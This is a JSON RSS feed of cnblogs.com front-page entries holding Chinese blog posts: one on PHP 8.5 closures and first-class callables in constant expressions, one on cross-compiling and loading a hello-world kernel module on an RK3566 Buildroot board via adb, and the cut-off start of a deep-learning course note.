{
  "title": "主页 - 博客园",
  "link": "https://www.cnblogs.com/",
  "description": "主页 - 博客园 RSS",
  "entries": [
    {
      "title": "PHP 8.5 闭包和一等可调用对象进入常量表达式",
      "link": "https://www.cnblogs.com/catchadmin/p/19494966",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/catchadmin/p/19494966\" id=\"cb_post_title_url\" title=\"发布于 2026-01-17 08:09\">\n    <span>PHP 8.5 闭包和一等可调用对象进入常量表达式</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"php-85-闭包和一等可调用对象进入常量表达式\">PHP 8.5 闭包和一等可调用对象进入常量表达式</h1>\n<h2 id=\"当配置变成运行时胶水代码\">当\"配置\"变成运行时胶水代码</h2>\n<p>PHP 配置一直有个矛盾：</p>\n<ul>\n<li>你想要声明式配置：简单的数组、常量值、属性。</li>\n<li>但你也需要一点逻辑：\"验证这个字段\"、\"选择这个处理器\"、\"格式化这个值\"、\"过滤这个列表\"。</li>\n</ul>\n<p>以前，一旦你需要在\"配置类\"的地方加逻辑，就会碰壁。PHP 故意把很多结构限制在常量表达式——基本上就是不可变的值。属性参数是最明显的例子：你可以放整数、字符串、标量数组……但不能放闭包。</p>\n<p>所以我们用各种变通方案：</p>\n<ul>\n<li>存字符串如 <code>\"App\\\\Handler::handle\"</code>，然后用 <code>call_user_func</code> 调用。</li>\n<li>在属性里用\"迷你语言\"，比如表达式字符串。</li>\n<li>用可空回调，在运行时设置默认值。</li>\n<li>在引导文件里建注册表，而不是直接在该放的地方表达。</li>\n</ul>\n<p>PHP 8.5 改变了这个局面：静态闭包和一等可调用对象现在可以出现在常量表达式中，包括：</p>\n<ul>\n<li>属性参数</li>\n<li>属性和参数的默认值</li>\n<li>常量和类常量</li>\n</ul>\n<p>这听起来像编译器特性。实际上是个\"生活质量\"升级：让你把配置放在它配置的代码旁边，不用魔术字符串或运行时初始化 hack。</p>\n<p>这篇文章会讲\"为什么\"、具体规则（有重要限制），然后深入实际模式：路由映射、处理器注册表、策略/格式化器注册表。也会讲哪些场景不适合——因为如果不小心，可调用配置确实能搞出一团乱。</p>\n<p><a href=\"https://catchadmin.com/post/2026-01/php85-closures-callables-constant-expressions\" rel=\"noopener nofollow\" target=\"_blank\">原文 PHP 8.5 闭包和一等可调用对象进入常量表达式</a></p>\n<h2 id=\"旧痛点常量太受限逻辑只能塞进运行时初始化\">旧痛点：常量太受限，逻辑只能塞进运行时初始化</h2>\n<p>PHP 8.5 之前，限制不是你不能创建闭包——而是你不能在某些\"配置槽\"里用它们。</p>\n<p>三个常见痛点：</p>\n<h3 id=\"痛点-a回调默认值参数强制运行时初始化\">痛点 A：\"回调默认值\"参数强制运行时初始化</h3>\n<p>如果你想写一个接受可选回调的函数，并且想要一个合理的默认回调，通常这样做：</p>\n<pre><code class=\"language-php\">function my_filter(array $items, ?Closure $predicate = null): array\n{\n    $predicate ??= static function ($v): bool { return !empty($v); };\n    $out = [];\n    foreach ($items as $item) {\n        if ($predicate($item)) {\n            $out[] = $item;\n        }\n    }\n    return $out;\n}\n</code></pre>\n<p>这能用……但是样板代码，而且不是\"声明式\"的。</p>\n<p>PHP 8.5 的 RFC 明确提到这个用例：允许直接声明默认回调闭包，不用可空参数的变通方案。</p>\n<h3 id=\"痛点-b属性参数不能包含真正的逻辑\">痛点 B：属性参数不能包含真正的逻辑</h3>\n<p>属性是表达规则的自然场所：</p>\n<ul>\n<li>授权检查</li>\n<li>验证</li>\n<li>序列化行为</li>\n<li>测试用例生成</li>\n</ul>\n<p>但属性参数只能是常量表达式，所以人们用字符串或表达式对象。</p>\n<p>PHP 8.5 发布公告展示了一个典型的\"之前\"模式，访问控制属性接受字符串表达式。在 PHP 8.5 中你可以直接传静态闭包。</p>\n<h3 id=\"痛点-c注册表和路由映射变成运行时引导\">痛点 C：注册表和路由映射变成运行时引导</h3>\n<p>任何时候你想要从\"键\"到\"处理器\"的映射，你可能在运行时构建它：</p>\n<pre><code class=\"language-php\">$handlers = [\n    'json' =&gt; [JsonFormatter::class, 'format'],\n    'text' =&gt; [TextFormatter::class, 'format'],\n];\n</code></pre>\n<p>这能用，但很脆弱：</p>\n<ul>\n<li>IDE 重命名重构不能可靠地跟踪字符串方法名。</li>\n<li>静态分析更难理解什么是可调用的。</li>\n<li>你需要运行时代码来组装概念上是静态配置的东西。</li>\n</ul>\n<p>PHP 8.5 的常量表达式改进让你可以把这些注册表表达为常量——并且让处理器重构安全。</p>\n<h2 id=\"什么是常量表达式为什么重要\">什么是常量表达式，为什么重要</h2>\n<p>\"常量表达式\"是 PHP 内部术语，指在必须不依赖运行时状态就能计算的上下文中允许的表达式——可以理解为\"不可变值\"。</p>\n<p>这些上下文包括：</p>\n<ul>\n<li>属性参数</li>\n<li>参数和属性的默认值</li>\n<li>（类）常量</li>\n</ul>\n<p>闭包 RFC 总结旧规则为：常量表达式被限制在实际上是\"不可变值\"的操作，闭包不包括在内——尽管闭包本质上是编译后的代码（操作码），在约束下可以被视为不可变。</p>\n<p>为什么这很重要？</p>\n<p>因为这些上下文是你想放配置的地方：</p>\n<ul>\n<li>属性是你的元数据/配置层。</li>\n<li>默认参数/属性值表达预期行为，不需要样板代码。</li>\n<li>常量表达\"这个映射不会变\"。</li>\n</ul>\n<p>换句话说：常量表达式是 PHP 引导你走向声明式代码的地方。PHP 8.5 扩展了\"声明式\"的含义。</p>\n<h2 id=\"常量中的闭包安全可读的模式和硬性规则\">常量中的闭包：安全可读的模式（和硬性规则）</h2>\n<p>PHP 8.5 允许常量表达式中的闭包——但有严格约束：</p>\n<ul>\n<li>必须是静态的（没有 <code>$this</code>）。</li>\n<li>不能通过 <code>use(...)</code> 捕获外部变量。</li>\n<li>箭头函数在常量表达式中不支持，因为它们隐式捕获变量。</li>\n</ul>\n<p>这些规则是编译时强制的。</p>\n<p>这听起来有限制，但实际上这正是这个特性安全的原因：它防止意外把\"运行时状态\"偷渡进常量。</p>\n<h3 id=\"默认回调参数不需要可空样板\">默认回调参数，不需要可空样板</h3>\n<p>这是之前过滤器示例的干净 PHP 8.5 版本：</p>\n<pre><code class=\"language-php\">&lt;?php\ndeclare(strict_types=1);\n\nfunction my_filter(\n    array $items,\n    Closure $predicate = static function ($v): bool { return !empty($v); },\n): array {\n    $out = [];\n    foreach ($items as $item) {\n        if ($predicate($item)) {\n            $out[] = $item;\n        }\n    }\n    return $out;\n}\n</code></pre>\n<p>这正是闭包 RFC 强调的动机：你可以声明一个真正的默认回调，不需要\"可空 + 运行时默认\"。</p>\n<p>实际上，这也改善了工具支持：</p>\n<ul>\n<li>参数正确地类型化为 <code>Closure</code>，不是 <code>?Closure</code></li>\n<li>调用者不需要猜测 <code>null</code> 是否有特殊含义</li>\n<li>你去掉了一个分支和一行初始化噪音</li>\n</ul>\n<h3 id=\"包含可调用行为的类常量\">包含可调用行为的类常量</h3>\n<p>你可以在常量或类常量中存储闭包，把它们当作\"可调用配置\"。</p>\n<p>一个简单例子：格式化器注册表。</p>\n<pre><code class=\"language-php\">&lt;?php\ndeclare(strict_types=1);\n\nfinal class Formatters\n{\n    public const MAP = [\n        'trim_lower' =&gt; static function (string $s): string {\n            return strtolower(trim($s));\n        },\n        'digits_only' =&gt; static function (string $s): string {\n            return preg_replace('/\\D+/', '', $s) ?? '';\n        },\n    ];\n}\n</code></pre>\n<p>使用：</p>\n<pre><code class=\"language-php\">$input = \"  +62 (812) 345-678  \";\n$normalized = (Formatters::MAP['digits_only'])($input);\n</code></pre>\n<p>这读起来像配置，但不是\"字符串类型\"。它是真正的 PHP，编译过的，有类型的，可重构的。</p>\n<h3 id=\"属性默认值可调用行为作为默认策略\">属性默认值：可调用行为作为默认策略</h3>\n<p>因为常量表达式中的闭包可以用作属性默认值，你可以在属性声明处定义默认策略——同样不需要运行时初始化。</p>\n<p>例子：可配置的规范化器。</p>\n<pre><code class=\"language-php\">&lt;?php\ndeclare(strict_types=1);\n\nfinal class Normalizer\n{\n    public Closure $normalize = static function (string $s): string {\n        return trim($s);\n    };\n\n    public function run(string $value): string\n    {\n        return ($this-&gt;normalize)($value);\n    }\n}\n</code></pre>\n<p><strong>重要细节</strong>：常量表达式中的闭包必须是静态的，这意味着闭包本身不能用 <code>$this</code>。</p>\n<p>这是故意的权衡：常量表达式只求值一次，而 <code>$this</code> 只有在闭包为每个对象实例重新创建时才有意义（这不是常量表达式的行为方式）。</p>\n<h3 id=\"作用域闭包在正确的上下文中仍然能看到私有成员\">作用域：闭包在正确的上下文中仍然能看到私有成员</h3>\n<p>尽管闭包必须是静态的（没有 <code>$this</code>），在这些常量上下文中创建的闭包仍然遵循正常的作用域规则。RFC 说明：</p>\n<ul>\n<li>属性默认值中的闭包可以访问所在类的私有属性/方法/常量</li>\n<li>属性参数中的闭包可以访问所在类的私有成员</li>\n</ul>\n<p>这启用了一个好模式：把复杂逻辑放在私有静态辅助方法中，把闭包作为配置暴露出来。</p>\n<h2 id=\"常量中的一等可调用对象重构安全的引用不用字符串\">常量中的一等可调用对象：重构安全的引用，不用字符串</h2>\n<p>闭包适合\"内联逻辑\"。但有时候你不想要内联逻辑——你想指向一个现有的函数或静态方法。</p>\n<p>这就是一等可调用对象（FCC）的用武之地。</p>\n<p>一等可调用对象看起来像：</p>\n<pre><code class=\"language-php\">strrev(...)\nMyClass::myMethod(...)\n</code></pre>\n<p>它们产生一个转发到函数/方法的 <code>Closure</code>。</p>\n<p>PHP 8.5 现在允许常量表达式中的 FCC 语法，旨在\"完善\"常量中闭包的特性。</p>\n<h3 id=\"为什么-fcc-比字符串可调用更好\">为什么 FCC 比字符串可调用更好</h3>\n<p>比较这两个：</p>\n<pre><code class=\"language-php\">// 旧方式\npublic const HANDLERS = [\n    'reverse' =&gt; 'strrev',\n    'slug' =&gt; 'App\\\\Slugger::slugify',\n];\n</code></pre>\n<p>对比：</p>\n<pre><code class=\"language-php\">// PHP 8.5\npublic const HANDLERS = [\n    'reverse' =&gt; strrev(...),\n    'slug' =&gt; Slugger::slugify(...),\n];\n</code></pre>\n<p>第二个版本更好，因为：</p>\n<ul>\n<li>可重构：重命名和移动更可靠</li>\n<li>静态分析可以理解它是可调用的</li>\n<li>你避免了魔术字符串和运行时可调用解析</li>\n</ul>\n<h3 id=\"常量表达式中-fcc-的约束\">常量表达式中 FCC 的约束</h3>\n<p>FCC RFC 添加了一些重要限制（除了正常的 FCC 规则）：</p>\n<ul>\n<li>只支持独立函数和静态方法（<code>::</code>）。</li>\n<li>只支持 <code>function_name(...)</code> 和 <code>ClassName::methodName(...)</code> 语法。</li>\n<li>你不能用表达式构建名称（<code>($fn)(...)</code>）、数组（<code>[ClassName::class, 'method'](...)</code>），或依赖 <code>__callStatic()</code> 魔术方法。</li>\n</ul>\n<p>这是好事：它让常量表达式中的 FCC 用法清晰且可分析。</p>\n<h2 id=\"实际用例\">实际用例</h2>\n<h3 id=\"用例路由映射作为常量\">用例：路由映射作为常量</h3>\n<p>传统方式，路由映射是运行时构建的：</p>\n<pre><code class=\"language-php\">$routes = [\n    'GET /health' =&gt; [HealthController::class, 'check'],\n    'GET /posts'  =&gt; [PostsController::class, 'index'],\n];\n</code></pre>\n<p>这能用，但不是重构安全的。</p>\n<p>在 PHP 8.5 中你可以用 FCC 或静态闭包定义路由映射，作为常量：</p>\n<pre><code class=\"language-php\">&lt;?php\ndeclare(strict_types=1);\n\nfinal class Routes\n{\n    public const MAP = [\n        'GET /health' =&gt; HealthController::check(...),\n        'GET /posts'  =&gt; PostsController::index(...),\n        // 快速端点的内联处理器\n        'GET /version' =&gt; static function (Request $req): Response {\n            return Response::text('ok');\n        },\n    ];\n}\n</code></pre>\n<p>现在你可以实现一个简单的分发器：</p>\n<pre><code class=\"language-php\">final class Dispatcher\n{\n    public function dispatch(Request $req): Response\n    {\n        $key = $req-&gt;method . ' ' . $req-&gt;path;\n        $handler = Routes::MAP[$key] ?? null;\n        if ($handler === null) {\n            return Response::text('Not found', 404);\n        }\n        return $handler($req);\n    }\n}\n</code></pre>\n<p>这个模式有几个好处：</p>\n<ul>\n<li>路由映射是真正的常量配置。</li>\n<li>处理器是真正的可调用对象，不是字符串。</li>\n<li>重构更安全（特别是静态方法处理器）。</li>\n</ul>\n<p>实际的路由器需要路径参数；但即使这样，\"处理器注册表\"部分通常保持静态。</p>\n<h3 id=\"用例消息总线的处理器注册表\">用例：消息总线的处理器注册表</h3>\n<p>想象一个简单的消息总线：消息类映射到处理器。</p>\n<p>旧方式：</p>\n<pre><code class=\"language-php\">$handlers = [\n    UserRegistered::class =&gt; 'App\\\\Handlers\\\\SendWelcomeEmail::handle',\n];\n</code></pre>\n<p>现在，用 PHP 8.5 FCC：</p>\n<pre><code class=\"language-php\">final class MessageHandlers\n{\n    public const MAP = [\n        UserRegistered::class =&gt; SendWelcomeEmail::handle(...),\n        OrderPaid::class      =&gt; CreateInvoice::handle(...),\n    ];\n}\n</code></pre>\n<p>分发器：</p>\n<pre><code class=\"language-php\">final class Bus\n{\n    public function __construct(private Container $container) {}\n\n    public function handle(object $message): void\n    {\n        $handler = MessageHandlers::MAP[$message::class] ?? null;\n        if ($handler === null) {\n            throw new RuntimeException('No handler registered for ' . $message::class);\n        }\n        // 如果处理器是静态的，它们可以显式接受依赖，\n        // 或者你可以调整这个模式（见下面的 DI 说明）。\n        $handler($message, $this-&gt;container);\n    }\n}\n</code></pre>\n<p>关键概念：常量表达式让你把映射保持在常量中，但你仍然控制依赖如何注入——通过签名设计。</p>\n<h3 id=\"用例策略格式化器注册表switch-语句的干净替代\">用例：策略/格式化器注册表（switch 语句的干净替代）</h3>\n<p>这是我最喜欢的实际用途：替换一个不断增长的 switch。</p>\n<pre><code class=\"language-php\">function format(string $type, mixed $value): string\n{\n    return match ($type) {\n        'json' =&gt; json_encode($value),\n        'text' =&gt; (string) $value,\n        'upper' =&gt; strtoupper((string) $value),\n        default =&gt; throw new InvalidArgumentException('Unknown formatter'),\n    };\n}\n</code></pre>\n<p>现在想象这增长到 15-30 个策略。你最终得到一个大 match 和一个 diff 磁铁。</p>\n<p>用可调用常量：</p>\n<pre><code class=\"language-php\">final class FormatterRegistry\n{\n    public const FORMATTERS = [\n        'json' =&gt; static function (mixed $v): string {\n            return json_encode($v, JSON_THROW_ON_ERROR);\n        },\n        'text' =&gt; static function (mixed $v): string {\n            return (string) $v;\n        },\n        // FCC 到原生函数\n        'reverse' =&gt; strrev(...),\n    ];\n\n    public static function format(string $type, mixed $value): string\n    {\n        $fn = self::FORMATTERS[$type] ?? null;\n        if ($fn === null) {\n            throw new InvalidArgumentException(\"Unknown formatter: {$type}\");\n        }\n        return $fn($value);\n    }\n}\n</code></pre>\n<p>现在添加策略只需要改一行。</p>\n<h2 id=\"测试和依赖注入什么该放常量什么该放容器\">测试和依赖注入：什么该放常量，什么该放容器</h2>\n<p>这个特性引导你走向\"代码即配置\"。这很好——直到你开始把运行时状态注入到应该是静态的东西里。</p>\n<p>一个好的心智模型：</p>\n<ul>\n<li><strong>常量应该包含稳定的接线</strong>：映射、策略、不依赖运行时状态的小逻辑片段。</li>\n<li><strong>DI 容器应该包含运行时组装</strong>：需要环境相关接线的对象、IO 资源、凭证、连接等。</li>\n</ul>\n<h3 id=\"好的常量可调用用法纯粹的转换和策略\">好的常量可调用用法：纯粹的转换和策略</h3>\n<p>这些在常量表达式中是安全的：</p>\n<ul>\n<li>规范化函数（trim、canonicalize）</li>\n<li>路由/分发选择逻辑</li>\n<li>只依赖输入值的验证器</li>\n<li>格式化器和映射器</li>\n</ul>\n<h3 id=\"di-的用武之地当你需要依赖时\">DI 的用武之地：当你需要依赖时</h3>\n<p>你仍然可以通过设计可调用对象显式接受依赖来混合可调用配置和 DI。</p>\n<p>例子：注册表返回一个接受 <code>(Message $m, Container $c)</code> 的可调用对象：</p>\n<pre><code class=\"language-php\">final class Handlers\n{\n    public const MAP = [\n        UserRegistered::class =&gt; static function (UserRegistered $m, Container $c): void {\n            $mailer = $c-&gt;get(Mailer::class);\n            $mailer-&gt;sendWelcome($m-&gt;email);\n        },\n    ];\n}\n</code></pre>\n<p>这保持在约束内，因为闭包是静态的且不捕获状态。\"依赖解析\"在调用时发生，容器被传入。</p>\n<p>这总是理想的吗？不是。但它是一个干净、显式的桥梁。</p>\n<h3 id=\"测试影响更好的默认值更容易覆盖\">测试影响：更好的默认值，更容易覆盖</h3>\n<p>常量表达式闭包让默认值更干净：</p>\n<ul>\n<li>函数可以有默认闭包参数（不用可空）。</li>\n<li>属性可以有默认闭包策略。</li>\n</ul>\n<p>对于测试，你仍然可以通过传递不同的闭包参数或给对象属性赋值不同的策略来覆盖行为（如果该属性设计上是可变的）。主要改进是默认行为在它该在的地方表达，你不需要运行时初始化胶水代码来创建默认闭包。</p>\n<h2 id=\"陷阱捕获状态副作用和团队可读性\">陷阱：捕获状态、副作用和团队可读性</h2>\n<p>这个特性给你在\"配置上下文\"中更多能力。能力带来新的搬起石头砸自己脚的方式。</p>\n<h3 id=\"陷阱-a试图捕获状态不会编译这是好事\">陷阱 A：试图捕获状态（不会编译——这是好事）</h3>\n<p>你不能这样做：</p>\n<pre><code class=\"language-php\">$prefix = \"prod_\";\nconst FN = static function (string $s) use ($prefix): string {\n    return $prefix . $s;\n};\n</code></pre>\n<p>常量表达式中的闭包不能通过 <code>use(...)</code> 捕获变量。</p>\n<p>这是硬性约束，它强迫你采用更好的设计：</p>\n<ul>\n<li>把值作为参数传递</li>\n<li>使用常量/类常量</li>\n<li>或者做运行时配置，而不是假装它是常量</li>\n</ul>\n<p>类似地，箭头函数在常量表达式中被阻止，因为它们隐式捕获变量。</p>\n<h3 id=\"陷阱-b在配置里隐藏副作用\">陷阱 B：在\"配置\"里隐藏副作用</h3>\n<p>如果你的\"注册表\"闭包开始做 IO、访问数据库、读取环境变量等，你就让配置变得不可预测了。</p>\n<p>一个好规则：</p>\n<p>如果可调用对象做的不只是\"计算并返回\"，考虑把它移到真正的服务中，通过静态方法引用它（或容器接线）。</p>\n<h3 id=\"陷阱-c在纯数据更清晰的地方用可调用配置\">陷阱 C：在纯数据更清晰的地方用可调用配置</h3>\n<p>仅仅因为你能在属性里放代码，不意味着你应该这样做。</p>\n<p>如果你的规则可以表达为简单数据——用数据。例子：</p>\n<ul>\n<li>允许的角色</li>\n<li>数字范围</li>\n<li>枚举集合</li>\n</ul>\n<p>可调用配置应该是你的工具，用于数据本身变得笨拙的情况（或者你否则会发明一个字符串表达式 DSL）。</p>\n<h3 id=\"陷阱-d团队间的可读性和一致性\">陷阱 D：团队间的可读性和一致性</h3>\n<p>可调用配置仍然是代码。如果你的团队经验水平不一，你需要约定：</p>\n<ul>\n<li>保持常量表达式闭包简短。</li>\n<li>当闭包超过约 10 行时，倾向于命名逻辑并通过 FCC 引用它（<code>SomeClass::somePolicy(...)</code>）。</li>\n<li>避免花哨写法（特别是嵌套匿名函数）。</li>\n</ul>\n<h2 id=\"指南什么时候配置应该保持数据什么时候可调用配置是合理的\">指南：什么时候配置应该保持\"数据\"，什么时候\"可调用配置\"是合理的</h2>\n<p>这是一套在实际代码库中通常效果不错的实用指南。</p>\n<p><strong>在以下情况倾向于纯数据配置：</strong></p>\n<ul>\n<li>规则是静态且小的（标志、列表、阈值）</li>\n<li>你想要容易序列化（比如导出配置）</li>\n<li>你想让非开发者可以编辑配置（在某些组织中）</li>\n</ul>\n<p>例子：</p>\n<pre><code class=\"language-php\">final class Limits\n{\n    public const MAX_TITLE_LENGTH = 120;\n    public const ALLOWED_SORTS = ['newest', 'popular', 'discussed'];\n}\n</code></pre>\n<p><strong>在以下情况使用可调用配置：</strong></p>\n<ul>\n<li>规则简单但不能很好地映射到数据（比如谓词）</li>\n<li>使用数据会把你推向自定义 DSL</li>\n<li>你想通过属性让配置靠近类/方法</li>\n<li>你想要重构安全的可调用对象而不是字符串</li>\n</ul>\n<p>这正是 PHP 8.5 在属性、默认值和常量中启用的。</p>\n<p><strong>保持可调用配置安全且可维护：</strong></p>\n<ul>\n<li>让闭包静态（反正是必须的）。</li>\n<li>不要试图捕获外部变量（<code>use(...)</code> 不允许）。</li>\n<li>当逻辑增长时：把它移到命名的静态方法并用 FCC 引用它，PHP 8.5 现在在常量表达式中允许这样做。</li>\n<li>只在支持的形式中使用 FCC：<code>function_name(...)</code> 和 <code>ClassName::methodName(...)</code>（不支持数组可调用语法）。</li>\n</ul>\n<h3 id=\"关于性能和-opcache-的说明\">关于性能和 opcache 的说明</h3>\n<p>如果你想知道这是否\"免费\"，两个 RFC 都提到 opcache 需要调整才能正确地在共享内存中存储这些闭包/可调用对象。</p>\n<p>换句话说：这个特性的实现考虑了真实世界的运行时环境（opcache/JIT）。目标不是微优化——而是表达力和安全性。</p>\n<h2 id=\"小结\">小结</h2>\n<p>PHP 8.5 支持常量表达式中的静态闭包和一等可调用对象，这是那种在更新日志上看起来很小、然后悄悄改善你设计 API 方式的特性：</p>\n<ul>\n<li>默认回调变得干净且类型正确（不用可空样板）。</li>\n<li>属性可以携带真正的可执行策略逻辑——不用字符串 DSL。</li>\n<li>注册表和路由映射可以定义为常量，使用重构安全的可调用对象。</li>\n</ul>\n<p>约束就是护栏：不能捕获变量、没有 <code>$this</code>、常量表达式中没有箭头函数。</p>\n<p>如果你接受这些护栏，你会得到一个真正更好的\"编译时风格\"配置层——接线是静态的、可读的、重构更安全。</p>\n<p>用它来移除胶水代码，而不是隐藏复杂性。保持可调用配置简短，给重的东西命名，让你的常量描述\"发生什么\"，而不是把它们变成迷你应用程序。</p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-17 08:09</span>&nbsp;\n<a href=\"https://www.cnblogs.com/catchadmin\">JaguarJack</a>&nbsp;\n阅读(<span id=\"post_view_count\">10</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "编写一个Buildroot 驱动",
      "link": "https://www.cnblogs.com/tianwuyvlianshui/p/19494280",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/tianwuyvlianshui/p/19494280\" id=\"cb_post_title_url\" title=\"发布于 2026-01-16 22:45\">\n    <span>编写一个Buildroot 驱动</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"编写一个buildroot-驱动模块\">编写一个Buildroot 驱动模块</h1>\n<p>由于Buildroot 不支持ssh</p>\n<p>故采用adb调试</p>\n<h2 id=\"adb连接\">adb连接</h2>\n<h3 id=\"列出设备\">列出设备</h3>\n<pre><code>adb devices\n</code></pre>\n<p><img alt=\"image-20260116202202616\" src=\"https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260116224244254-2021753310.png\" /></p>\n<h3 id=\"连接设备\">连接设备</h3>\n<pre><code>adb shell\n</code></pre>\n<p><img alt=\"image-20260116202213317\" src=\"https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260116224245370-1464333835.png\" /></p>\n<h2 id=\"驱动模块编译交叉编译\">驱动模块编译(交叉编译)</h2>\n<h3 id=\"驱动模块源码\">驱动模块源码</h3>\n<pre><code class=\"language-c\">#include &lt;linux/module.h&gt;     /* 模块相关宏和函数 */\n#include &lt;linux/kernel.h&gt;     /* printk日志函数 */\n\n/* 加载函数（驱动入口），当驱动被 insmod 加载时自动执行 */\nstatic int __init helloworld_init(void)\n{\n    printk(\"helloworld_init\\r\\n\"); // 内核日志打印\n    return 0; // 返回0代表加载成功\n}\n\n/* 卸载函数（驱动出口），当驱动被 rmmod 卸载时自动执行 */\nstatic void __exit helloworld_exit(void)\n{\n    printk(\"helloworld_exit\\r\\n\");\n}\n\n/* 下面这两行，告诉内核入口和出口分别是哪两个函数 */\nmodule_init(helloworld_init);\nmodule_exit(helloworld_exit);\n\n/* 这3个是模块信息声明 */\nMODULE_LICENSE(\"GPL v2\");               /* 模块许可证 */\nMODULE_VERSION(\"1.0\");                  /* 模块版本，可选 */\nMODULE_DESCRIPTION(\"helloworld Driver\");/* 模块描述，可选，一般用于 lsmod 时显示 */\n</code></pre>\n<p>功能简单解释就是</p>\n<blockquote>\n<p>加载驱动：打印<strong>helloworld_init</strong></p>\n<p>卸载驱动：打印<strong>helloworld_exit</strong></p>\n</blockquote>\n<p>找到交叉编译工具路径</p>\n<pre><code>find prebuilts -name \"*gcc\" -type f\n</code></pre>\n<p><img alt=\"image-20260116221419705\" src=\"https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260116224245922-1390693708.png\" /></p>\n<p>一般在SDK路径下找</p>\n<h3 id=\"配置makefile\">配置Makefile</h3>\n<pre><code class=\"language-makefile\"># 目标架构\n# RK3566 是 ARM64 架构\nARCH ?= arm64\n\n# 交叉编译工具链前缀\n# 最终会使用：aarch64-linux-gnu-gcc / ld / objcopy 等\nCROSS_COMPILE ?= aarch64-linux-gnu-\n\n# Linux 内核源码目录\n# 必须是已经配置并且执行过 prepare/modules_prepare 的内核\n#作用：告诉 Makefile 用哪个内核版本的源码和头文件进行编译链接。\nKDIR := $(HOME)/Desktop/SDK/kernel\n\n# 当前外部模块源码所在目录\n# 内核会在这个目录下查找 obj-m 指定的模块源码\nPWD  := $(shell pwd)\n\n# 要编译的外部内核模块\n# hello_world.c  →  hello_world.ko\nobj-m += hello_world.o\n\n# 默认目标：编译内核模块\nall:\n\t# 调用内核源码目录下的 Makefile\n\t# M=$(PWD) 表示这是一个“外部模块”\n\t# ARCH / CROSS_COMPILE 指定目标架构和交叉编译器\n\t$(MAKE) -C $(KDIR) M=$(PWD) \\\n\t\tARCH=$(ARCH) CROSS_COMPILE=$(CROSS_COMPILE) modules\n\n# 清理编译生成的中间文件\nclean:\n\t$(MAKE) -C $(KDIR) M=$(PWD) clean\n\n</code></pre>\n<p>PS：主要寻找配置</p>\n<blockquote>\n<p>交叉编译工具链前缀：aarch64-linux-gnu-</p>\n<p>Linux 内核源码目录路径：$(HOME)/Desktop/SDK/kernel</p>\n</blockquote>\n<h3 id=\"编译\">编译</h3>\n<pre><code>make\n</code></pre>\n<p>模块输出路径</p>\n<p><img alt=\"image-20260116222818781\" src=\"https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260116224246555-359569486.png\" /></p>\n<h2 id=\"驱动测试\">驱动测试</h2>\n<h3 id=\"将驱动复制进rk3566板卡\">将驱动复制进rk3566板卡</h3>\n<h4 id=\"使用adb\">使用ADB</h4>\n<p>如果ADB已经连上板卡，则先断开连接</p>\n<pre><code>exit\n</code></pre>\n<p>寻找板卡设备</p>\n<pre><code>adb devices\n</code></pre>\n<p><img alt=\"image-20260116223436138\" src=\"https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260116224247234-648064983.png\" /></p>\n<p>将本地的驱动模块文件发送到板卡</p>\n<pre><code>adb -s 6c392aca38ad7c4b push F:\\Desktop\\SSH_Ubuntu18\\hello_world.ko /data/local/tmp/hello_world.ko\n</code></pre>\n<p><img alt=\"image-20260116223652779\" src=\"https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260116224248167-2138743187.png\" /></p>\n<h3 id=\"加载驱动模块\">加载驱动模块：</h3>\n<pre><code>insmod hello_world.ko\t\n</code></pre>\n<p>查看 驱动 相关日志</p>\n<pre><code>dmesg | grep -E 'hello'\t\n</code></pre>\n<p><img alt=\"image-20260116223813105\" src=\"https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260116224248958-58986670.png\" /></p>\n<h3 id=\"卸载模块驱动\">卸载模块驱动</h3>\n<pre><code>rmmod hello_world.ko\n</code></pre>\n<p>查看 驱动 相关日志</p>\n<pre><code>dmesg | grep -E 'hello'\t\n</code></pre>\n<p><img alt=\"image-20260116223939679\" src=\"https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260116224249850-1462602200.png\" /></p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-16 22:45</span>&nbsp;\n<a href=\"https://www.cnblogs.com/tianwuyvlianshui\">沁拒离</a>&nbsp;\n阅读(<span id=\"post_view_count\">8</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "吴恩达深度学习课程五：自然语言处理  第二周：词嵌入（一）词汇表征和类比推理",
      "link": "https://www.cnblogs.com/Goblinscholar/p/19494158",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/Goblinscholar/p/19494158\" id=\"cb_post_title_url\" title=\"发布于 2026-01-16 21:41\">\n    <span>吴恩达深度学习课程五：自然语言处理  第二周：词嵌入（一）词汇表征和类比推理</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>此分类用于记录吴恩达深度学习课程的学习笔记。<br />\n课程相关信息链接如下：</p>\n<ol>\n<li>原课程视频链接：<a 